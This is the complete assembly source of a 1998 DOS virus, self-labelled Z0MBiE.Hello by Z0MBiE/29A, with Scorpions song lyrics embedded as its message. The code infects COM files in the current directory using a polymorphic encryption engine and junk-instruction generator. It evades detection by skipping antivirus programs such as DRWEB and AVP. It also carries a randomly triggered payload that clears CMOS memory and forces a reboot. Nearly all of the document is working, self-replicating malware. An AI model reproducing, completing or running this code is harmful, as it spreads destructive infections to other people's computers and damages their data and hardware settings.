
DEBUG                   equ     1

max_rnd                 equ     127

min_size                equ     256
max_size                equ     65536-256-2-vir_memory-max_rnd-max_rnd-300


dta_struc               struc
                        ; internal
dta_driveletter         db      ?               ; 0=Ay
dta_name8               db      8 dup (?)       ;
dta_ext3                db      3 dup (?)       ;
dta_searchattr          db      ?               ;
dta_direntrynum         dw      ?               ; 0=. 1=..
dta_dircluster          dw      ?
                        dd      ?               ; unused
                        ; public
dta_attr                db      ?               ; 1=r 32=a 16=d 2=h 4=s 8=v
dta_time                dw      ?               ; ççççç¬¬¬ ¬¬¬ááááá
dta_date                dw      ?               ; £££££££¬ ¬¬¬¤¤¤¤¤
dta_size                dd      ?
dta_name                db      13 dup (?)
                        ends

                        model   small
                        p386
                        locals  __
                        jumps

code                    segment word public 'CODE' use16
                        assume  cs:code, ds:code, es:code, ss:code

                        org     100h
code_start:

main_msg:
song_start:
db '',13,10
db ' Z0MBiE.Hello.'
db vir_size/1000 mod 10 + '0'
db vir_size/ 100 mod 10 + '0'
db vir_size/  10 mod 10 + '0'
db vir_size/   1 mod 10 + '0'
db '  (c) 1998  with best regards, Z0MBiE/29A',13,10
db ' members.xoom.com/Z0MBiE, z0mbie_29a@yahoo.com',13,10
db '',13,10
db ' This living code is dedicated to my friends',13,10
db '',13,10
db ' S.S.R., LordASD, Nutcracker, Zhengxi,',13,10
db ' Jacky Qwerty, Vecna, GriYo, Darkman, MrSandman,',13,10
db ' Reptile, Wintermute, Super, Ypsilon, TCP, Rajaat, VirusBuster,',13,10
db ' Al-Khana, Dr.Evil, Avgur and all other...',13,10
db '',13,10
db ' UNDER THE SAME SUN',13,10
db ' Scorpions',13,10
db '',13,10
db ' I saw the morning',13,10
db ' It was shattered by a gun',13,10
db ' Heard a scream, saw him fall, no one cried',13,10
db ' I saw a mother',13,10
db ' She was praying for her son',13,10
db ' Bring him back, let him live, don''t let him die',13,10
db '',13,10
db ' Do you ever ask yourself',13,10
db ' Is there a Heaven in the sky',13,10
db ' Why can''t we get it right',13,10
db '',13,10
db ' ''cause we all live under the same sun',13,10
db ' We all walk under the same moon',13,10
db ' Then why, why can''t we live as one',13,10
db '',13,10
db ' I saw the evening',13,10
db ' Fading shadows one by one',13,10
db ' We watch the lamb, lay down to the sacrifice',13,10
db ' I saw the children',13,10
db ' The children of the sun',13,10
db ' How they wept, how they bled, how they died',13,10
db '',13,10
db ' Do you ever ask yourself',13,10
db ' Is there a Heaven in the sky',13,10
db ' Why can''t we stop the fight',13,10
db '',13,10
db ' ''cause we all live under the same sun',13,10
db ' We all walk under the same moon',13,10
db ' Then why, why can''t we live as one',13,10
db '',13,10
db ' Sometimes I think I''m going mad',13,10
db ' We''re loosing all we had and no one seems to care',13,10
db ' But in my heart it doesn''t change',13,10
db ' We''ve got to rearrange and bring our world some love',13,10
db '',13,10
db ' And does it really matter',13,10
db ' If there''s a heaven up above',13,10
db ' We sure could use some love',13,10
db '',13,10
db ' ''cause we all live under the same sun',13,10
db ' We all walk under the same moon',13,10
db ' Then why, why can''t we live as one',13,10
db ' ''cause we all live under the same sky',13,10
db ' We all look up at the same stars',13,10
db ' Then why, tell me why can''t we live as one',13,10
db '',13,10
db '$'

song_end:
song_size               equ     song_end-song_start

csum_1                  dw      ?
csum_2                  dw      ?

rnd_kill:               pusha

                        call    __getip
__getip:                pop     bp
                        sub     bp, offset __getip

                        call    calc_cs
                        mov     ax, csum_a[bp]
                        mov     dx, csum_b[bp]
                        mov     csum_1[bp], ax
                        mov     csum_2[bp], dx

                        mov     ax, song_size
                        call    rnd
                        mov     si, ax

                        mov     ax, 8
                        call    rnd
                        mov     cx, ax
                        mov     al, 1
                        shl     ax, cl
                        xor     byte ptr song_start[si][bp], al

                        popa
                        ret

rnd_restore:            pusha

                        call    __getip
__getip:                pop     bp
                        sub     bp, offset __getip

                        lea     si, song_start[bp]
                        mov     cx, song_size

__1:                    mov     dx, 8

__2:                    mov     al, [si]
                        mov     save_byte[bp], al

                        mov     cx, dx
                        dec     cx
                        mov     al, 1
                        shl     al, cl
                        xor     [si], al

                        call    calc_cs
                        mov     ax, csum_a[bp]
                        cmp     ax, csum_1[bp]
                        jne     __3
                        mov     ax, csum_b[bp]
                        cmp     ax, csum_2[bp]
                        je      __4

__3:                    mov     al, save_byte[bp]
                        mov     [si], al

                        dec     dx
                        jnz     __2

                        inc     si
                        loop    __1

                        mov     al, 7
                        int     29h
                        mov     ax, 4cffh
                        int     21h

__4:                    popa
                        ret

calc_cs:                pusha

                        call    __getip
__getip:                pop     bp
                        sub     bp, offset __getip

                        xor     cx, cx
                        xor     dx, dx

                        lea     si, song_start[bp]
                        mov     bx, song_size

__1:                    lodsb

                        xor     cl, al
                        add     ch, al
                        xor     dl, al
                        sub     dh, al
                        xchg    cx, dx
                        rol     cx, 1
                        ror     dx, 1
                        dec     cx
                        inc     dx

                        dec     bx
                        jnz     __1

                        mov     csum_a[bp], cx
                        mov     csum_b[bp], dx

                        popa
                        ret

orig_encrypt:
orig_decrypt:           pusha

                        call    __getip
__getip:                pop     bp
                        sub     bp, offset __getip

                        mov     dx, song_size
                        lea     di, song_start[bp]

                        mov     cx, orig_size[bp]
                        lea     si, orig[bp]

                        xor     ax, ax
                        mov     bx, 1234h
crypt_key               equ     word ptr $-2

__1:                    push    ax

                        mov     al, cs:[si]

                        xor     al, cs:[di]
                        xor     al, bl
                        xor     al, bh

                        mov     cs:[si], al

                        pop     ax

                        dec     bl
                        rol     bl, 1
                        inc     bh
                        ror     bh, 1
                        xchg    bl, bh

                        inc     si
                        inc     di

                        dec     cx
                        jnz     __2

                        mov     cx, orig_size[bp]
                        lea     si, orig[bp]

__2:                    dec     dx
                        jnz     __3

                        mov     dx, song_size
                        lea     di, song_start[bp]

__3:                    dec     ax
                        jnz     __1

                        popa
                        ret

com_entry:              call    __getip
__getip:                pop     bp
                        sub     bp, offset __getip

                        mov     al, 80h
                        out     80h, al
                        in      al, 80h
                        xor     al, 80h

                        lea     si, kill_web[bp]
                        mov     cx, kill_size
__0:                    xor     [si], al
                        inc     si
                        loop    __0

kill_web:
                        call    effect

                        call    rnd_restore
                        call    orig_decrypt

                        lea     si, orig[bp]
                        mov     di, 0100h
                        mov     cx, orig_size[bp]
                        cld
                        rep     movsb

                        call    infect_dir

                        push    cs
                        pop     ds
                        push    cs
                        pop     es

                        mov     si, 0100h
                        jmp     si

effect:                 mov     ax, 666
                        call    rnd
                        or      ax, ax

IFDEF                   DEBUG
                        nop
                        nop
ELSE
                        jz      destroy
ENDIF

                        ret

destroy:                call    __getip
__getip:                pop     bp
                        sub     bp, offset __getip

                        xor     al, al
__1:                    out     70h, al
                        out     71h, al
                        inc     al
                        jnz     __1

                        mov     ah, 9
                        push    cs
                        pop     ds
                        lea     dx, main_msg[bp]
                        int     21h

                        xor     ax, ax
                        int     16h

                        db      0eah
                        dd      0f000fff0h

infect_dir:             push    cs
                        pop     ds

                        call    __getip
__getip:                pop     bp
                        sub     bp, offset __getip

                        mov     ah, 1ah
                        lea     dx, sdta[bp]
                        int     21h

                        mov     ah, 4eh
                        lea     dx, allfiles[bp]
                        mov     cx, 1+2+4+32
__1:                    int     21h
                        jc      __2

                        lea     dx, sdta[bp].dta_name
                        call    infect_file

                        mov     ah, 4fh
                        jmp     __1

__2:                    mov     ah, 1ah
                        mov     dx, 0080h
                        int     21h

                        ret

allfiles                db      '*.*',0

                        ; input: ds:dx=file name

infect_file:            pusha
                        push    ds es

                        call    __getip
__getip:                pop     bp
                        sub     bp, offset __getip

                        mov     ah, 60h
                        mov     si, dx
                        push    cs
                        pop     es
                        lea     di, filename[bp]
                        int     21h
                        jc      __exit

                        mov     ah, 2fh
                        int     21h
                        push    es
                        push    bx

                        mov     ah, 1ah
                        push    cs
                        pop     ds
                        lea     dx, dta[bp]
                        int     21h

                        mov     ah, 4eh
                        lea     dx, filename[bp]
                        mov     cx, 1+2+4+32
                        int     21h

                        mov     ah, 1ah
                        pop     dx
                        pop     ds
                        int     21h

                        jc      __exit

                        push    cs
                        pop     ds

                        mov     ax, dta[bp].dta_size.word ptr 0
                        mov     dx, dta[bp].dta_size.word ptr 2

                        or      dx, dx
                        jnz     __exit

                        cmp     ax, min_size
                        jb      __exit
                        cmp     ax, max_size
                        ja      __exit

                        test    ax, 511
                        jz      __exit

                        mov     cx, 100
                        div     cx
                        cmp     dx, 9
                        jbe     __exit

                        mov     cx, dta[bp].dta_time
                        mov     dx, dta[bp].dta_date
                        mov     al, dl
                        sub     al, dh
                        cmp     al, cl
                        je      __exit

                        lea     si, dta[bp].dta_name8
                        lea     di, bad_names[bp]
                        mov     dx, bad_names_max
                        mov     cx, 8
                        call    is_in_list
                        jc      __exit

                        lea     si, dta[bp].dta_ext3
                        lea     di, bad_ext[bp]
                        mov     dx, bad_ext_max
                        mov     cx, 3
                        call    is_in_list
                        jnc     __exit

                        test    dta[bp].dta_attr, 2+4
                        jnz     __exit

                        test    dta[bp].dta_attr, 1
                        jz      __1

                        mov     ax, 4301h
                        lea     dx, filename[bp]
                        xor     cx, cx
                        int     21h
                        jc      __exit

__1:                    mov     ax, 3d02h
                        lea     dx, filename[bp]
                        int     21h
                        jc      __exit

                        xchg    bx, ax

                        mov     ax, max_orig_size - min_orig_size
                        call    rnd
                        add     ax, min_orig_size
                        mov     orig_size[bp], ax

                        mov     ah, 3fh
                        lea     dx, orig[bp]
                        mov     cx, orig_size[bp]
                        int     21h

                        mov     ax, orig[bp].word ptr 0
                        not     ax
                        mul     ah
                        cmp     ax, 72BAh  ; (not 'M') * (not 'Z')
                        je      __close

                        mov     ax, orig[bp].word ptr (com_ID-com_start)
                        cmp     ax, com_ID[bp]
                        je      __close

                        inc     crypt_key[bp]
                        dec     com_ID[bp]
                        call    orig_encrypt

                        call    rnd_kill

                        mov     ax, 4202h
                        cwd
                        xor     cx, cx
                        int     21h

                        mov     ax, max_rnd
                        call    rnd
                        mov     cx, ax
                        mov     ah, 40h
                        xor     dx, dx
                        mov     ds, dx
                        int     21h

                        push    cs
                        pop     ds

                        mov     ax, 4201h
                        cwd
                        xor     cx, cx
                        int     21h

                        mov     engine_offs[bp], ax

                        add     ax, -3
                        mov     com_jmp[bp], ax

                        call    engine

                        mov     ah, 40h
                        lea     dx, engine_buf[bp]
                        mov     cx, engine_size[bp]
                        int     21h

                        mov     ax, max_rnd
                        call    rnd
                        mov     cx, ax
                        mov     ah, 40h
                        xor     dx, dx
                        mov     ds, dx
                        int     21h

                        push    cs
                        pop     ds

                        mov     ax, 4200h
                        cwd
                        xor     cx, cx
                        int     21h

                        mov     ah, 40h
                        lea     dx, com_E9[bp]
                        mov     cx, com_size
                        int     21h

__close:                mov     ax, 5701h
                        mov     cx, dta[bp].dta_time
                        mov     dx, dta[bp].dta_date
                        mov     cl, dl
                        sub     cl, dh
                        int     21h

                        mov     ah, 3eh
                        int     21h

                        test    dta[bp].dta_attr, 1
                        jz      __2

                        mov     ax, 4301h
                        lea     dx, filename[bp]
                        xor     cx, cx
                        mov     cl, dta[bp].dta_attr
                        int     21h

__2:

__exit:                 pop     es ds
                        popa
                        ret

kill_size               equ     $-kill_web

com_start:
com_E9                  db      0E9h
com_jmp                 dw      ?
com_ID                  dw      1234h
com_size                equ     $-com_start

orig_size               dw      64

min_orig_size           equ     32
max_orig_size           equ     128
orig                    db      max_orig_size dup ('?')

random:                 push    bp

                        call    __getip
__getip:                pop     bp
                        sub     bp, offset __getip

                        push    bx
                        mov     bx, 1234h
rndword                 equ     word ptr $-2
                        in      al, 40h
                        xor     bl, al
                        in      al, 40h
                        add     bh, al
                        in      al, 41h
                        sub     bl, al
                        in      al, 41h
                        xor     bh, al
                        in      al, 42h
                        add     bl, al
                        in      al, 42h
                        sub     bh, al
                        mov     cs:rndword[bp], bx
                        xchg    bx, ax
                        pop     bx

                        pop     bp

                        test    al, 1
                        ret

rnd:                    push    bx
                        push    dx
                        xchg    bx, ax
                        call    random
                        xor     dx, dx
                        div     bx
                        xchg    dx, ax
                        pop     dx
                        pop     bx
                        test    al, 1
                        ret

is_in_list:

__4:                    pusha
__2:                    mov     al, cs:[di]
                        cmp     al, '?'
                        je      __1
                        cmp     al, cs:[si]
                        jne     __3
__1:                    inc     di
                        inc     si
                        loop    __2
                        popa

                        stc
                        ret

__3:                    popa
                        add     di, cx

                        dec     dx
                        jnz     __4

                        clc
                        ret

bad_names:              db      'COMMAND?'
                        db      'AIDS????'
                        db      'DRWEB???'
                        db      'WEB?????'
                        db      'ADINF???'
                        db      'AVP?????'
                        db      'EMM386??'
bad_names_max           equ     ($-bad_names)/8

bad_ext:                db      'COM'
                        db      'EXE'
bad_ext_max             equ     ($-bad_ext)/3


engine:                 pusha
                        push    ds es

                        call    __getip
__getip:                pop     bp
                        sub     bp, offset __getip

                        push    cs
                        pop     ds
                        push    cs
                        pop     es

                        mov     ax, 1024
                        call    rnd
                        add     ax, 1024
                        mov     decr_size[bp], ax

                        call    random
                        mov     add_byte[bp], al
                        mov     sub_byte[bp], ah
                        call    random
                        mov     xor_byte[bp], al

                        lea     di, engine_buf[bp]

                        push    di
                        mov     cx, max_engine_size
                        mov     al, 0
                        cld
                        rep     stosb
                        pop     di

                        ;;;

                        mov     ax, 4
                        call    rnd
                        mov     ir[bp], ax   ; 0 1 2 3

                        ;;;

                        call    add_sux

                        lea     bx, a_1_ptr[bp]
                        call    add_4
                        mov     ax, engine_offs[bp]
                        add     ax, 100h
                        add     ax, decr_size[bp]
                        stosw

                        call    add_sux

                        mov     save_jb[bp], di

                        call    add_sux

                        lea     bx, b_1_ptr[bp]
                        call    add_4
                        mov     al, add_byte[bp]
                        stosb

                        call    add_sux

                        lea     bx, d_1_ptr[bp]
                        call    add_4
                        mov     al, xor_byte[bp]
                        stosb

                        call    add_sux

                        lea     bx, c_1_ptr[bp]
                        call    add_4
                        mov     al, sub_byte[bp]
                        stosb

                        call    add_sux

                        lea     bx, f_1_ptr[bp]
                        call    add_4

                        call    add_sux

                        lea     bx, e_1_ptr[bp]
                        call    add_4
                        mov     ax, 300
                        call    rnd
                        add     ax, engine_offs[bp]
                        add     ax, 100h
                        add     ax, decr_size[bp]
                        add     ax, vir_size
                        stosw

                      ; call    add_sux

                        mov     ax, 820fh
                        stosw
                        stosw
                        mov     ax, save_jb[bp]
                        sub     ax, di
                        mov     [di-2], ax

                        call    add_sux

                        call    random
                        and     al, 1
                        add     al, 0e8h
                        stosb
                        stosw
                        lea     ax, engine_buf[bp]
                        add     ax, decr_size[bp]
                        add     ax, com_entry-code_start
                        sub     ax, di
                        mov     [di-2], ax

                        lea     di, engine_buf[bp]
                        add     di, decr_size[bp]

                        lea     si, code_start[bp]
                        mov     cx, code_size
                        cld
__1:                    lodsb
                        add     al, sub_byte[bp]
                        xor     al, xor_byte[bp]
                        sub     al, add_byte[bp]
                        stosb
                        loop    __1

                        lea     ax, engine_buf[bp]
                        sub     di, ax
                        mov     engine_size[bp], di

                        pop     es ds
                        popa
                        ret

add_sux:

__next:                 push    di
                        mov     cx, 32
                        xor     al, al
                        repz    scasb
                        pop     di
                        or      cx, cx
                        jnz     __jmp

                        mov     ax, 20
                        call    rnd

                        cmp     ax, 0
                        je      __exit

                        cmp     ax, 8
                        jbe     __jmp

                        jmp     __shit

__exit:                 ret

__jmp:

__0:                    mov     ax, decr_size[bp]
                        sub     ax, 64
                        call    rnd
                        add     ax, 32
                        lea     bx, engine_buf[bp]
                        add     bx, ax

                        push    di
                        lea     di, [bx-16]
                        mov     cx, 32+16
                        xor     al, al
                        repz    scasb
                        pop     di
                        or      cx, cx
                        jnz     __0

                        call    random
                        and     al, 1
                        mov     al, 0e8h
                        stosb
                        mov     cl, al

                        stosw
                        mov     ax, bx
                        sub     ax, di
                        mov     [di-2], ax

                        mov     di, bx

                        cmp     cl, 0e8h
                        jne     __a
                        mov     al, 059h  ; pop cx
                        stosb
__a:

                        jmp     __next

__shit:                 mov     ax, shit_max
                        call    rnd
                        imul    ax, 3
                        lea     bx, shit[bp]
                        add     bx, ax

                        mov     al, [bx]
                        cmp     al, 90h
                        je      __2
                        stosb

__2:                    mov     al, [bx+1]
                        stosb

                        mov     al, [bx+2]
                        cmp     al, 66h
                        jne     __1
                        call    random
__1:                    stosb

                        mov     ax, 3
                        call    rnd
                        or      ax, ax
                        je      __next

                        jmp     __exit

shit:                   nop
                        mov     al, 66h

                        nop
                        mov     ah, 66h

                        nop
                        mov     dl, 66h

                        nop
                        mov     dh, 66h

                        nop
                        mov     cl, 66h

                        nop
                        mov     ch, 66h

                        nop
                        add     al, 66h
                        add     ah, 66h
                        add     dl, 66h
                        add     dh, 66h
                        add     cl, 66h
                        add     ch, 66h

                        nop
                        adc     al, 66h
                        adc     ah, 66h
                        adc     dl, 66h
                        adc     dh, 66h
                        adc     cl, 66h
                        adc     ch, 66h

                        nop
                        sub     al, 66h
                        sub     ah, 66h
                        sub     dl, 66h
                        sub     dh, 66h
                        sub     cl, 66h
                        sub     ch, 66h

                        nop
                        sbb     al, 66h
                        sbb     ah, 66h
                        sbb     dl, 66h
                        sbb     dh, 66h
                        sbb     cl, 66h
                        sbb     ch, 66h

                        nop
                        xor     al, 66h
                        xor     ah, 66h
                        xor     dl, 66h
                        xor     dh, 66h
                        xor     cl, 66h
                        xor     ch, 66h

                        nop
                        test    al, 66h
                        test    ah, 66h
                        test    dl, 66h
                        test    dh, 66h
                        test    cl, 66h
                        test    ch, 66h

                        nop
                        and     al, 66h
                        and     ah, 66h
                        and     dl, 66h
                        and     dh, 66h
                        and     cl, 66h
                        and     ch, 66h

                        nop
                        or      al, 66h
                        or      ah, 66h
                        or      dl, 66h
                        or      dh, 66h
                        or      cl, 66h
                        or      ch, 66h

                        nop
                        cmp     al, 66h
                        cmp     ah, 66h
                        cmp     dl, 66h
                        cmp     dh, 66h
                        cmp     cl, 66h
                        cmp     ch, 66h

shit_max                equ     ($-shit)/3

add_4:                  mov     ax, ir[bp]
                        shl     ax, 1
                        add     bx, ax
                        mov     si, [bx]
                        add     si, bp
                        lodsw
                        xchg    cx, ax
                        rep     movsb
                        ret

a_1_ptr                 dw      a_1
                        dw      a_2
                        dw      a_3
                        dw      a_4
a_1                     dw      1
                        db      0beh
a_2                     dw      1
                        db      0bfh
a_3                     dw      1
                        db      0bbh
a_4                     dw      1
                        db      0bdh

b_1_ptr                 dw      b_1
                        dw      b_2
                        dw      b_3
                        dw      b_4
b_1                     dw      2
                        db      80h,04h
b_2                     dw      2
                        db      80h,05h
b_3                     dw      2
                        db      80h,07h
b_4                     dw      3
                        db      80h,46h,00h

c_1_ptr                 dw      c_1
                        dw      c_2
                        dw      c_3
                        dw      c_4
c_1                     dw      2
                        db      80h,2ch
c_2                     dw      2
                        db      80h,2dh
c_3                     dw      2
                        db      80h,2fh
c_4                     dw      3
                        db      80h,6eh,00h


d_1_ptr                 dw      d_1
                        dw      d_2
                        dw      d_3
                        dw      d_4
d_1                     dw      2
                        db      80h,34h
d_2                     dw      2
                        db      80h,35h
d_3                     dw      2
                        db      80h,37h
d_4                     dw      3
                        db      80h,76h,00h



e_1_ptr                 dw      e_1
                        dw      e_2
                        dw      e_3
                        dw      e_4
e_1                     dw      2
                        db      81h,0feh
e_2                     dw      2
                        db      81h,0ffh
e_3                     dw      2
                        db      81h,0fbh
e_4                     dw      2
                        db      81h,0fdh

f_1_ptr                 dw      f_1
                        dw      f_2
                        dw      f_3
                        dw      f_4
f_1                     dw      1
                        db      46h
f_2                     dw      1
                        db      47h
f_3                     dw      1
                        db      43h
f_4                     dw      1
                        db      45h

;                        mov     si, 0100h
;__1:
;
;                        not     [si]
;                        cmp     si, 1234h
;                        jb      __1


code_end:
code_size               equ     code_end-code_start

data_start:

filename                db      256 dup (?)
sdta                    dta_struc ?
dta                     dta_struc ?

csum_a                  dw      ?
csum_b                  dw      ?

engine_offs             dw      ?
decr_size               dw      ?

ir                      dw      ?
add_byte                db      ?
sub_byte                db      ?
xor_byte                db      ?

save_jb                 dw      ?
save_byte               db      ?

max_engine_size         equ     8192
engine_size             dw      ?
engine_buf              db      max_engine_size dup (?)

data_end:
data_size               equ     data_end-data_start

vir_size                equ     code_size
vir_memory              equ     code_size+data_size
vir_par                 equ     (vir_memory+15)/16


loader:                 push    cs
                        pop     ds
                        lea     dx, testfile
                        call    infect_file

                        mov     ax, 4c00h
                        int     21h

testfile                db      'test.com',0


code                    ends
                        end     loader
